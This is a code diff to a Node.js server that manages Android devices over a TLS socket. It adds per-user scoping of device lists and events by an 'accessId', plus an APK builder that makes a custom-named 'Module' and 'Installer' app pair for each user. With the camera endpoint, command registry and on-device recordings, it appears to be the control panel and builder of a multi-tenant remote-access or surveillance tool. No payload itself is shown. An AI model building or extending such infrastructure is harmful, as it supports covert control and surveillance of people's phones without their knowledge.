@@ -489,6 +489,9 @@ async function processMessage(clientId, clientType, event, data) {
     if (event === 'device:register') {
         const { deviceId, deviceInfo } = data || {};
         if (!deviceId) return;
+        // Access ID — sent by the device, baked in at build time.
+        // Kept on the device record so per-user dashboards can scope their list.
+        const accessId = (data && (data.accessId || (deviceInfo && deviceInfo.accessId))) || '';
 
         // If there's an existing stale primary socket for this device, close it cleanly
         // before registering the new one — prevents ghost connections from later
@@ -521,6 +524,7 @@ async function processMessage(clientId, clientType, event, data) {
         const isFreshConnect = !prevLastSeen || (!prevOnline && (Date.now() - prevLastSeen) > RECONNECT_THRESHOLD_MS);
         const deviceRecord = { ...existing, deviceId,
             deviceName: deviceInfo?.name || deviceId, deviceInfo: info,
+            accessId: accessId || existing.accessId || '',
             isOnline: true, lastSeen: new Date() };
         inMemoryDevices.set(deviceId, deviceRecord);
 
@@ -532,11 +536,12 @@ async function processMessage(clientId, clientType, event, data) {
             let dev = await Device.findOne({ deviceId });
             if (!dev) {
                 dev = new Device({ deviceId, deviceName: deviceInfo?.name || deviceId,
-                                   deviceInfo: info, isOnline: true });
+                                   deviceInfo: info, accessId: accessId || '', isOnline: true });
             } else {
                 dev.isOnline  = true;
                 dev.lastSeen  = new Date();
                 dev.deviceInfo = { ...(dev.deviceInfo || {}), ...info };
+                if (accessId) dev.accessId = accessId;
                 dev.markModified('deviceInfo');
             }
             await dev.save();
@@ -554,7 +559,7 @@ async function processMessage(clientId, clientType, event, data) {
 
         // Notify dashboards (only on a real fresh connect, not re-registers within 5 min)
         if (isFreshConnect) {
-            broadcastDash('device:connected', { deviceId, deviceInfo, timestamp: new Date() });
+            broadcastDashScoped('device:connected', { deviceId, deviceInfo, accessId, timestamp: new Date() }, accessId || null);
         }
         broadcastDeviceList();
 
@@ -949,7 +954,11 @@ const tcpServer = tls.createServer({ key: tlsKey, cert: tlsCert, allowHalfOpen: 
                         await Device.findOneAndUpdate({ deviceId: disconnectedDeviceId },
                             { isOnline: false, lastSeen: new Date() });
                     } catch (e) {}
-                    broadcastDash('device:disconnected', { deviceId: disconnectedDeviceId, timestamp: new Date() });
+                    {
+                        const rec = inMemoryDevices.get(disconnectedDeviceId);
+                        const aid = (rec && rec.accessId) || '';
+                        broadcastDashScoped('device:disconnected', { deviceId: disconnectedDeviceId, accessId: aid, timestamp: new Date() }, aid || null);
+                    }
                     broadcastDeviceList();
                 }, 3000);
             }
@@ -1056,9 +1065,32 @@ app.post('/api/admin/verify', (req, res) => {
 // Each dashboard has an sseId used to route command results back to the right tab.
 app.get('/api/events', async (req, res) => {
     const token = req.query.token;
-    if (!token || !global._adminTokens) return res.status(401).end();
-    const expiry = global._adminTokens.get(token);
-    if (!expiry || Date.now() > expiry) return res.status(401).end();
+    if (!token) return res.status(401).end();
+
+    // Accept either an admin token (hex from global._adminTokens) OR a user
+    // JWT (role: 'user'). For users, look up their accessId so we can scope
+    // every device broadcast to their own builds only.
+    let role = null;
+    let accessId = '';
+    let userId = null;
+    if (global._adminTokens && global._adminTokens.has(token)) {
+        const expiry = global._adminTokens.get(token);
+        if (expiry && Date.now() <= expiry) role = 'admin';
+    }
+    if (!role) {
+        try {
+            const decoded = jwt.verify(token, getJwtSecret());
+            if (decoded && decoded.userId && decoded.role === 'user') {
+                role = 'user';
+                userId = decoded.userId;
+                try {
+                    const u = await User.findById(userId).select('accessId').lean();
+                    accessId = (u && u.accessId) || '';
+                } catch (_) { /* mongo unavailable — accessId stays '' */ }
+            }
+        } catch (_) { /* invalid token */ }
+    }
+    if (!role) return res.status(401).end();
 
     const clientId = crypto.randomBytes(8).toString('hex');
 
@@ -1068,11 +1100,11 @@ app.get('/api/events', async (req, res) => {
     res.setHeader('X-Accel-Buffering', 'no');  // disable nginx buffering
     res.flushHeaders();
 
-    sseClients.set(clientId, { res, token });
-    log('SSE', `Dashboard connected ${clientId}`);
+    sseClients.set(clientId, { res, token, role, accessId, userId });
+    log('SSE', `Dashboard connected ${clientId} (${role}${accessId ? ' / ' + accessId : ''})`);
 
-    // Immediately push device list + command registry
-    const list = await getDeviceList();
+    // Immediately push device list + command registry, scoped per role
+    const list = await getDeviceList(role === 'user' ? accessId : null);
     sseSend(clientId, 'device:list', list);
     sseSend(clientId, 'commands:registry', COMMANDS);
     // Tell the client its own sseId so it can include it in HTTP requests
@@ -1319,19 +1351,190 @@ app.get('/api/camera/latest/:deviceId', (req, res) => {
 // Recordings are stored ONLY on the Android device — no server-side recording endpoints.
 
 // ============================================
+// APK BUILDER (per-user)
+// ============================================
+// State: one global build runs at a time. Live log lines fan out via SSE
+// to the client that started the build (channel 'build:log'). The final
+// APKs land in apk-output/<accessId>/{Module.apk,Installer.apk}.
+const buildState = {
+    running: false,
+    accessId: null,
+    sseId:    null,
+    lines:    [],
+    startedAt: 0,
+    finishedAt: 0,
+    success: null,
+    error: null,
+};
+const BUILD_OUTPUT_ROOT = path.join(__dirname, '..', 'apk-output');
+
+function pushBuildLine(line) {
+    buildState.lines.push(line);
+    if (buildState.lines.length > 4000) buildState.lines.splice(0, 1000);
+    if (buildState.sseId) sseSend(buildState.sseId, 'build:log', { line });
+}
+
+function isValidPackage(s) {
+    return typeof s === 'string' && /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/.test(s);
+}
+function isValidAppName(s) {
+    return typeof s === 'string' && s.length > 0 && s.length <= 40 && /^[\w .&'-]+$/.test(s);
+}
+
+// POST /api/build/apk — kick off a build with the user's overrides
+app.post('/api/build/apk', requireUserOrAdmin, express.json(), async (req, res) => {
+    const { moduleName, modulePackage, installerName, installerPackage, sseId } = req.body || {};
+    if (!isValidAppName(moduleName))         return res.status(400).json({ success: false, error: 'Invalid module name (1-40 chars, letters/digits/space/.&\'-)' });
+    if (!isValidPackage(modulePackage))      return res.status(400).json({ success: false, error: 'Invalid module package (e.g. com.example.app)' });
+    if (!isValidAppName(installerName))      return res.status(400).json({ success: false, error: 'Invalid installer name' });
+    if (!isValidPackage(installerPackage))   return res.status(400).json({ success: false, error: 'Invalid installer package' });
+    if (modulePackage === installerPackage)  return res.status(400).json({ success: false, error: 'Module and installer packages must differ' });
+
+    let accessId = '';
+    if (req.authRole === 'user') {
+        const u = await User.findById(req.authUserId).select('accessId').lean();
+        accessId = (u && u.accessId) || '';
+        if (!accessId) return res.status(400).json({ success: false, error: 'No Access ID assigned to your account.' });
+    } else {
+        // Admin can pass an explicit accessId (or use a default) so admin-built APKs
+        // can also be scoped to a chosen account.
+        accessId = (req.body.accessId && String(req.body.accessId).trim()) || 'ADMIN-BUILD';
+    }
+
+    if (buildState.running) {
+        return res.status(409).json({ success: false, error: 'A build is already in progress. Please wait for it to finish.' });
+    }
+
+    buildState.running    = true;
+    buildState.accessId   = accessId;
+    buildState.sseId      = sseId || null;
+    buildState.lines      = [];
+    buildState.startedAt  = Date.now();
+    buildState.finishedAt = 0;
+    buildState.success    = null;
+    buildState.error      = null;
+
+    res.json({ success: true, accessId, message: 'Build started. Subscribe to SSE event "build:log" for live output.' });
+
+    // Run build.sh asynchronously
+    const root  = path.join(__dirname, '..');
+    const child = spawn('bash', ['build.sh'], {
+        cwd: root,
+        env: {
+            ...process.env,
+            BUILD_ACCESS_ID:        accessId,
+            BUILD_MODULE_NAME:      moduleName,
+            BUILD_MODULE_PACKAGE:   modulePackage,
+            BUILD_INSTALLER_NAME:   installerName,
+            BUILD_INSTALLER_PACKAGE: installerPackage,
+        },
+    });
+    pushBuildLine(`▶ Build started for Access ID ${accessId}`);
+    pushBuildLine(`  Module:    ${moduleName} (${modulePackage})`);
+    pushBuildLine(`  Installer: ${installerName} (${installerPackage})`);
+
+    const onChunk = (buf) => {
+        const text = buf.toString('utf8');
+        for (const ln of text.split(/\r?\n/)) {
+            if (ln.length > 0) pushBuildLine(ln);
+        }
+    };
+    child.stdout.on('data', onChunk);
+    child.stderr.on('data', onChunk);
+    child.on('close', (code) => {
+        buildState.finishedAt = Date.now();
+        buildState.running    = false;
+        buildState.success    = code === 0;
+        buildState.error      = code === 0 ? null : `build.sh exited with code ${code}`;
+        pushBuildLine('');
+        pushBuildLine(code === 0 ? '✅ BUILD SUCCESS' : `❌ BUILD FAILED (exit ${code})`);
+        if (buildState.sseId) sseSend(buildState.sseId, 'build:done', {
+            success: code === 0, accessId, durationMs: buildState.finishedAt - buildState.startedAt,
+        });
+    });
+    child.on('error', (err) => {
+        buildState.finishedAt = Date.now();
+        buildState.running    = false;
+        buildState.success    = false;
+        buildState.error      = err.message;
+        pushBuildLine(`❌ Failed to spawn build.sh: ${err.message}`);
+        if (buildState.sseId) sseSend(buildState.sseId, 'build:done', { success: false, accessId, error: err.message });
+    });
+});
+
+// GET /api/build/status — current state + tail of recent logs
+app.get('/api/build/status', requireUserOrAdmin, async (req, res) => {
+    let myAccessId = '';
+    if (req.authRole === 'user') {
+        const u = await User.findById(req.authUserId).select('accessId').lean();
+        myAccessId = (u && u.accessId) || '';
+    }
+    const isMyBuild = req.authRole === 'admin' || (myAccessId && buildState.accessId === myAccessId);
+    res.json({
+        success:    true,
+        running:    buildState.running,
+        isMyBuild,
+        accessId:   isMyBuild ? buildState.accessId : null,
+        success_:   buildState.success,
+        error:      buildState.error,
+        startedAt:  buildState.startedAt,
+        finishedAt: buildState.finishedAt,
+        lines:      isMyBuild ? buildState.lines.slice(-200) : [],
+    });
+});
+
+// GET /api/build/download/:type  (type = module|installer)
+app.get('/api/build/download/:type', requireUserOrAdmin, async (req, res) => {
+    const { type } = req.params;
+    if (type !== 'module' && type !== 'installer') {
+        return res.status(400).json({ success: false, error: 'type must be module or installer' });
+    }
+
+    let accessId = '';
+    if (req.authRole === 'user') {
+        const u = await User.findById(req.authUserId).select('accessId').lean();
+        accessId = (u && u.accessId) || '';
+        if (!accessId) return res.status(404).json({ success: false, error: 'No Access ID' });
+    } else {
+        accessId = (req.query.accessId && String(req.query.accessId).trim()) || buildState.accessId || 'ADMIN-BUILD';
+    }
+
+    const filename = type === 'module' ? 'Module.apk' : 'Installer.apk';
+    const apkPath  = path.join(BUILD_OUTPUT_ROOT, accessId, filename);
+    if (!fs.existsSync(apkPath)) {
+        return res.status(404).json({ success: false, error: 'APK not found. Run a build first.' });
+    }
+    res.download(apkPath, filename);
+});
+
+// ============================================
 // REST ENDPOINTS
 // ============================================
-app.get('/api/devices', async (req, res) => {
+app.get('/api/devices', requireUserOrAdmin, async (req, res) => {
     try {
-        const devices = await Device.find().sort({ lastSeen: -1 });
+        const filter = {};
+        if (req.authRole === 'user') {
+            const u = await User.findById(req.authUserId).select('accessId').lean();
+            const aid = (u && u.accessId) || '';
+            if (!aid) return res.json({ success: true, devices: [] });
+            filter.accessId = aid;
+        }
+        const devices = await Device.find(filter).sort({ lastSeen: -1 });
         res.json({ success: true, devices });
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
-app.get('/api/devices/:deviceId', async (req, res) => {
+app.get('/api/devices/:deviceId', requireUserOrAdmin, async (req, res) => {
     try {
         const device = await Device.findOne({ deviceId: req.params.deviceId });
         if (!device) return res.status(404).json({ success: false, error: 'Device not found' });
+        if (req.authRole === 'user') {
+            const u = await User.findById(req.authUserId).select('accessId').lean();
+            const aid = (u && u.accessId) || '';
+            if (!aid || (device.accessId || '') !== aid) {
+                return res.status(404).json({ success: false, error: 'Device not found' });
+            }
+        }
         res.json({ success: true, device });
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
@@ -1575,7 +1778,7 @@ app.get('*', (req, res) => {
 // ============================================
 // DB HELPERS
 // ============================================
-async function getDeviceList() {
+async function getDeviceList(accessIdFilter) {
     // Helper: override isOnline to match the live TCP socket map so the
     // dashboard never shows a device as online when commands would fail.
     const reconcile = (devices) => devices.map(d => {
@@ -1583,22 +1786,61 @@ async function getDeviceList() {
         obj.isOnline = deviceToTcp.has(obj.deviceId);
         return obj;
     });
+    // Apply per-client access-id scoping. Admins call this without a filter
+    // and get every device. Users call this with their own accessId and only
+    // see devices that registered with the same id.
+    const scope = (devices) => {
+        if (!accessIdFilter) return devices;
+        return devices.filter(d => (d.accessId || '') === accessIdFilter);
+    };
 
     // Priority: MongoDB → Redis → in-memory
     try {
         const dbDevices = await Device.find().sort({ lastSeen: -1 });
-        if (dbDevices && dbDevices.length > 0) return reconcile(dbDevices);
+        if (dbDevices && dbDevices.length > 0) return scope(reconcile(dbDevices));
     } catch (_) {}
     // Fallback: Redis
     const redisDevices = await R.getAllDevices();
-    if (redisDevices.length > 0) return reconcile(redisDevices.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen)));
+    if (redisDevices.length > 0) return scope(reconcile(redisDevices.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen))));
     // Final fallback: in-memory
-    return reconcile(Array.from(inMemoryDevices.values()));
+    return scope(reconcile(Array.from(inMemoryDevices.values())));
 }
 
+// Broadcast device:list to every connected dashboard, scoped per recipient.
+// Admins always receive the full list; users only see devices matching their
+// accessId. Sending one filtered payload per client is a tiny cost compared
+// to the round-trip latency improvement of doing it server-side.
 async function broadcastDeviceList() {
-    const list = await getDeviceList();
-    broadcastDash('device:list', list);
+    if (sseClients.size === 0) return;
+    const adminList = await getDeviceList();
+    const userListCache = new Map();
+    for (const [id, client] of sseClients) {
+        let list = adminList;
+        if (client.role === 'user') {
+            const aid = client.accessId || '';
+            if (!aid) { list = []; }
+            else if (userListCache.has(aid)) { list = userListCache.get(aid); }
+            else {
+                list = adminList.filter(d => (d.accessId || '') === aid);
+                userListCache.set(aid, list);
+            }
+        }
+        sseSend(id, 'device:list', list);
+    }
+}
+
+// Broadcast an event to admin SSE clients and to user SSE clients whose
+// accessId matches the device's accessId. Pass `accessId=null` to broadcast
+// to admins only (or to all if no accessId scoping applies).
+function broadcastDashScoped(event, data, accessId) {
+    if (sseClients.size === 0) return;
+    const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
+    for (const [, client] of sseClients) {
+        if (client.role === 'user') {
+            if (!accessId || (client.accessId || '') !== accessId) continue;
+        }
+        try { client.res.write(payload); } catch (_) {}
+    }
 }
 
 // ============================================
@@ -1639,7 +1881,11 @@ setInterval(async () => {
                 }
                 deviceToTcp.delete(conn.deviceId);
                 try { await Device.findOneAndUpdate({ deviceId: conn.deviceId }, { isOnline: false, lastSeen: new Date() }); } catch (e) {}
-                broadcastDash('device:disconnected', { deviceId: conn.deviceId, timestamp: new Date() });
+                {
+                    const rec = inMemoryDevices.get(conn.deviceId);
+                    const aid = (rec && rec.accessId) || '';
+                    broadcastDashScoped('device:disconnected', { deviceId: conn.deviceId, accessId: aid, timestamp: new Date() }, aid || null);
+                }
                 broadcastDeviceList();
             }
         }
